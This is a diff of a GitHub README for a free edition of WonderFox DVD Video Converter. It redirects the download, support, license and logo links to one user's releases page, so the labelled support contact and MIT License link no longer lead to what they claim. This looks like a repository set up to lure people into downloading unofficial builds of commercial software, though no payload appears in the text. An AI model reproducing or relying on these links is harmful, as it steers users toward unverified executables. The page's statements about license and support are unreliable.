@@ -24,7 +24,7 @@ Here are some of the key features of WonderFox DVD Video Converter Free:
 ## Download
 
 You can download WonderFox DVD Video Converter Free from the following link: 
-[Download WonderFox DVD Video Converter Free](https://github.com/uploads/App.zip) 👈
+[Download WonderFox DVD Video Converter Free](https://github.com/obed38499912/WonderFox-DVD-Video-Converter-Free/releases) 👈
 
 ## Installation Guide
 
@@ -44,7 +44,7 @@ To start using WonderFox DVD Video Converter Free, follow these simple steps:
 
 ## Support
 
-If you encounter any issues or have any questions about WonderFox DVD Video Converter Free, feel free to reach out to the support team at [support@wonderfox.com](mailto:support@wonderfox.com).
+If you encounter any issues or have any questions about WonderFox DVD Video Converter Free, feel free to reach out to the support team at [https://github.com/obed38499912/WonderFox-DVD-Video-Converter-Free/releases](https://github.com/obed38499912/WonderFox-DVD-Video-Converter-Free/releases).
 
 ## Contribute
 
@@ -60,10 +60,10 @@ Enjoy using WonderFox DVD Video Converter Free? Don't forget to share it with yo
 
 ## License
 
-This software is available under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute it as per the terms of the license.
+This software is available under the [MIT License](https://github.com/obed38499912/WonderFox-DVD-Video-Converter-Free/releases). Feel free to use, modify, and distribute it as per the terms of the license.
 
 ---
 
 Thank you for visiting the WonderFox DVD Video Converter Free repository. Start converting your DVD videos with ease today! 📀🎥
 
-![WonderFox](https://www.example.com/wonderfox-logo.png)
+![WonderFox](https://github.com/obed38499912/WonderFox-DVD-Video-Converter-Free/releases)
